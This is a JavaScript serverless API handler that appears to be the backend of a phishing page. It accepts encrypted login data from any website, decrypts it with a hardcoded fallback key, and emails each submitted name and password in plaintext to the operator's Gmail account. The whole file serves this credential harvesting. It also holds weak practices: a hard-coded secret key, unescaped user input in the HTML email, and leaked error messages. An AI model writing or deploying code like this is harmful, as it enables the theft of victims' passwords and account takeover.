import nodemailer from 'nodemailer';
import cors from 'cors';
import { createDecipheriv } from 'crypto';

const corsMiddleware = cors({ origin: '*', methods: ['POST'] });

const runMiddleware = (req, res, fn) => {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
};

const validateInput = (name, password) => {
  if (!name || typeof name !== 'string' || name.trim().length < 2) {
    return 'Name must be a string with at least 2 characters';
  }
  if (!password || typeof password !== 'string' || password.length < 6) {
    return 'Password must be a string with at least 6 characters';
  }
  return null;
};

const SECRET_KEY = process.env.SECRET_KEY || 'my-secret-key-1234567890123456';
const ALGORITHM = 'aes-256-cbc';
const IV_LENGTH = 16;

export default async function handler(req, res) {
  await runMiddleware(req, res, corsMiddleware);
  console.log('API /api/sendMail called with method:', req.method);

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { encrypted } = req.body;

  if (!encrypted) {
    return res.status(400).json({ message: 'No encrypted data provided' });
  }

  try {
    // Validate key length
    if (Buffer.from(SECRET_KEY).length !== 32) {
      throw new Error('Invalid key length: SECRET_KEY must be 32 bytes');
    }

    const encryptedText = Buffer.from(encrypted, 'base64');
    const iv = encryptedText.slice(0, IV_LENGTH);
    const encryptedData = encryptedText.slice(IV_LENGTH);
    const decipher = createDecipheriv(ALGORITHM, Buffer.from(SECRET_KEY), iv);
    let decrypted = decipher.update(encryptedData, 'binary', 'utf8');
    decrypted += decipher.final('utf8');

    const { name, password } = JSON.parse(decrypted);

    const validationError = validateInput(name, password);
    if (validationError) {
      return res.status(400).json({ message: validationError });
    }

    const sanitizedName = name.trim();
    const sanitizedPassword = password.trim();

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
      html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
    };

    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: 'Login details sent successfully' });
  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ message: 'Failed to process request', error: error.message });
  }
}
